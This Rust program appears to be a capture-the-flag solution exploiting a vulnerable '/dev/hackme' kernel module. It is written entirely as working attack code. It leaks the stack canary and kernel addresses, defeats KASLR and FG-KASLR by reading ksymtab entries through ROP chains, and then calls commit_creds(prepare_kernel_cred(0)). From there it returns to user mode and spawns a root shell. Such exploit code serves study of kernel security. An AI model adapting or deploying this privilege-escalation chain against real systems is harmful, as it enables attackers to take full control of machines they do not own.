use std::sync::atomic::{AtomicU64, Ordering};

use kpwn::all::*;

static SETJMP: Setjmp = Setjmp::new();
static RAX: AtomicU64 = AtomicU64::new(0);

#[derive(Default)]
struct Payload {
    unused: [u64; 20],
    chain: [u64; 12],
    frame: TrapFrame64,
}

extern "C" fn ret_from_leak() -> ! {
    let val: u64;
    unsafe {
        // Note: there is no guarantee that the following statement
        // actually reads the value of `rax` (in fact, it is impossible to
        // guarantee without using naked functions or `global_asm!`).
        // However, this happens to work on today's compilers, so to keep
        // things simple, we do it this way.
        std::arch::asm!("", out("rax") val);
    }
    log::info!("Back from kernel with rax = {val:#x}");

    RAX.store(val, Ordering::SeqCst);

    unsafe { SETJMP.resume_from_ckpt() }
}

extern "C" fn ret_from_kernel() -> ! {
    log::info!("Back from kernel space");
    whoami();
    execve_sh().unwrap();
    panic!();
}

fn main() {
    env_logger::builder()
        .filter_level(log::LevelFilter::Debug)
        .init();

    whoami();

    let dev = open_dev("/dev/hackme").unwrap();
    let mut buf = [0u64; 40];
    unsafe {
        dev.read_all_raw(&mut buf).unwrap();
    }
    // log::info!("{buf:#x?}");
    log::info!("Canary = {:#x}", buf[16]);
    // vfs_read + 0x9f
    log::info!("Return address 1 = {:#x}", buf[20]);
    // do_syscall_64 + 0x37
    log::info!("Return address 2 = {:#x}", buf[38]);

    // Note: this KernelRebaser is only effective for .text and .data sections
    // (not including any kernel functions where FG-KASLR is enabled)
    let kb = KernelRebaser::new(buf[38] - 0x100a157);
    let mut payload = Payload::default();
    payload.unused.copy_from_slice(&buf[0..20]);
    // .text end = +0x400dd7
    payload.chain = [
        0xffffffff81004d11, // pop rax
        0xffffffff81f8d4fc, // __ksymtab_prepare_kernel_cred
        0xffffffff81015a7f, // mov rax, [rax]; pop rbp; ret
        0xdeadbeef,
        0xffffffff81015a83, // ret
        0xffffffff81015a83, // ret
        0xffffffff81015a83, // ret
        0xffffffff81015a83, // ret
        0xffffffff81015a83, // ret
        0xffffffff81200f26, // swapgs
        0xdeadbeef,
        0xdeadbeef,
    ];
    kb.fixup_all(&mut payload.chain);
    payload.frame = TrapFrame64::new(ret_from_leak);

    log::info!("Stage 1: leak prepare_kernel_cred");
    SETJMP.set_and_run(|| {
        unsafe {
            dev.write_raw(&payload, std::mem::size_of::<Payload>())
                .unwrap();
        }
        log::error!("We failed :(");
        panic!();
    });
    // (i32 -> i64) ; __ksymtab_prepare_kernel_cred
    let prepare_kernel_cred =
        (RAX.load(Ordering::SeqCst) | 0xffff_ffff_0000_0000).wrapping_add(kb.r(0xffffffff81f8d4fc));
    log::info!(
        "Stage 1 completed, prepare_kernel_cred = {:#x}",
        prepare_kernel_cred,
    );

    payload.chain[1] = kb.r(0xffffffff81f87d90); // __ksymtab_commit_creds
    log::info!("Stage 2: leak commit_creds");
    SETJMP.set_and_run(|| {
        unsafe {
            dev.write_raw(&payload, std::mem::size_of::<Payload>())
                .unwrap();
        }
        log::error!("We failed :(");
        panic!();
    });
    // (i32 -> i64) ; __ksymtab_commit_creds
    let commit_creds =
        (RAX.load(Ordering::SeqCst) | 0xffff_ffff_0000_0000).wrapping_add(kb.r(0xffffffff81f87d90));
    log::info!("Stage 2 completed, commit_creds = {:#x}", commit_creds);

    payload.chain = [
        kb % 0xffffffff8100767c, // pop rdi
        0,
        prepare_kernel_cred,
        kb % 0xffffffff8100487a, // pop {rcx, rbp}
        0,
        0xdeadbeef,
        kb % 0xffffffff8100aedf, // mov rdi, rax; rep movsq; pop rbp; ret
        0,
        commit_creds,
        kb % 0xffffffff81200f26, // swapgs_restore_regs_and_return_to_usermode + 0x16
        0xdeadbeef,
        0xdeadbeef,
    ];
    payload.frame = TrapFrame64::new(ret_from_kernel);
    log::info!("Trigger!");
    unsafe {
        dev.write_raw(&payload, std::mem::size_of::<Payload>())
            .unwrap();
    }

    log::error!("We failed :(");
    dev.close().unwrap();
}
